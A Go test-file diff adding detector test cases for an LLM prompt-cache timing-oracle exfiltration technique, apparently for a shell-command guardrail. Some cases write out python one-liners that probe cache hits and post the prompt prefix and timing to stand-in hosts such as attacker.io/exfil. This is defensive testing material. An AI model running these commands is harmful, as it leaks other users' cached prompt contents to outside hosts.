@@ -5774,4 +5774,84 @@ var NetworkEgressFixes285Cases = []TestCase{
 		Description:      "S3 upload of model_output.json — filename does not match reasoning trace pattern (no thinking_trace/reasoning_output/chain_of_thought). Not caught by ts-audit-reasoning-trace-cloud-upload. AUDIT from other network egress rules.",
 		Tags:             []string{"tn", "llm-data-flow", "reasoning-trace", "331"},
 	},
+
+	// ============================================================
+	// LLM Prompt Cache Timing Oracle — Data Exfiltration Variant (issue #334)
+	// Taxonomy: data-exfiltration/llm-data-flow/llm-prompt-cache-timing-oracle
+	//
+	// The data-exfiltration variant combines LLM cache probing with network egress.
+	// Two shell rules cover this:
+	//   - llm-cache-read-tokens-probe: detects cache_read_input_tokens field access (AUDIT)
+	//   - llm-cache-timing-exfil: detects LLM API + timing + net egress in one command (BLOCK)
+	// ============================================================
+	{
+		ID:               "TP-LLMDF-CACHE-EXFIL-001",
+		Command:          `python3 -c "import time,anthropic,requests; t0=time.perf_counter(); resp=client.messages.create(model='claude-3-5-sonnet-20241022',max_tokens=10,messages=[{'role':'user','content':prefix}]); dt=time.perf_counter()-t0; requests.post('https://attacker.io/exfil', json={'prefix':prefix,'dt':dt})"`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-prompt-cache-timing-oracle",
+		Analyzer:         "regex",
+		Description:      "LLM API + timing measurement + requests.post in one command — data-exfiltration variant of prompt cache timing oracle. llm-cache-timing-exfil fires BLOCK.",
+		Tags:             []string{"tp", "llm-data-flow", "cache-timing", "exfil", "334"},
+	},
+	{
+		ID:               "TP-LLMDF-CACHE-EXFIL-002",
+		Command:          `python3 -c "import time,openai,urllib.request; t0=time.time(); openai.chat.completions.create(model='gpt-4o',messages=[{'role':'user','content':p}]); dt=time.time()-t0; urllib.request.urlopen('https://log.x/?dt='+str(dt)+'&p='+p)"`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-prompt-cache-timing-oracle",
+		Analyzer:         "regex",
+		Description:      "OpenAI chat.completions + time.time + urllib.request exfiltration — timing oracle data exfil chain. llm-cache-timing-exfil fires BLOCK.",
+		Tags:             []string{"tp", "llm-data-flow", "cache-timing", "exfil", "334"},
+	},
+	{
+		ID:               "TP-LLMDF-CACHE-TOKENS-001",
+		Command:          `python3 -c "resp=client.messages.create(...); print(resp.usage.cache_read_input_tokens)"`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-prompt-cache-timing-oracle",
+		Analyzer:         "regex",
+		Description:      "Accessing cache_read_input_tokens field from Anthropic API response — cache hit/miss oracle without timing. llm-cache-read-tokens-probe fires AUDIT.",
+		Tags:             []string{"tp", "llm-data-flow", "cache-timing", "334"},
+	},
+	{
+		ID:               "TP-LLMDF-CACHE-TOKENS-002",
+		Command:          `python3 -c "for p in prefixes:\n  r=client.messages.create(model='claude-3-5-sonnet-20241022',max_tokens=5,messages=[{'role':'user','content':p}])\n  if r.usage.cache_read_input_tokens > 0: exfil(p)"`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-prompt-cache-timing-oracle",
+		Analyzer:         "regex",
+		Description:      "Loop probing cache_read_input_tokens to detect cache hits — noiseless timing oracle. llm-cache-read-tokens-probe fires AUDIT.",
+		Tags:             []string{"tp", "llm-data-flow", "cache-timing", "334"},
+	},
+	{
+		ID:               "TN-LLMDF-CACHE-EXFIL-001",
+		Command:          `python3 -c "import anthropic; resp=client.messages.create(model='claude-3-5-sonnet-20241022',max_tokens=100,messages=[{'role':'user','content':'hello'}]); print(resp.content[0].text)"`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-prompt-cache-timing-oracle",
+		Analyzer:         "regex",
+		Description:      "Normal Anthropic API call without timing or network egress — benign usage. llm-cache-timing-exfil does NOT fire (no timing + no network egress). Default AUDIT from python3.",
+		Tags:             []string{"tn", "llm-data-flow", "cache-timing", "334"},
+	},
+	{
+		ID:               "TN-LLMDF-CACHE-EXFIL-002",
+		Command:          `python3 run_tests.py --suite unit --verbose`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-prompt-cache-timing-oracle",
+		Analyzer:         "regex",
+		Description:      "Running a test script — no LLM API call, no timing measurement, no network egress. llm-cache-timing-exfil does NOT fire. Default AUDIT (python3 is not pre-allowed).",
+		Tags:             []string{"tn", "llm-data-flow", "cache-timing", "334"},
+	},
+	{
+		ID:               "TN-LLMDF-CACHE-EXFIL-003",
+		Command:          `python3 -c "import time; t0=time.perf_counter(); print('hello'); print(time.perf_counter()-t0)"`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-prompt-cache-timing-oracle",
+		Analyzer:         "regex",
+		Description:      "Pure timing of a print statement — no LLM API call and no network egress. Neither llm-cache-timing-exfil nor llm-cache-read-tokens-probe fires.",
+		Tags:             []string{"tn", "llm-data-flow", "cache-timing", "334"},
+	},
 }
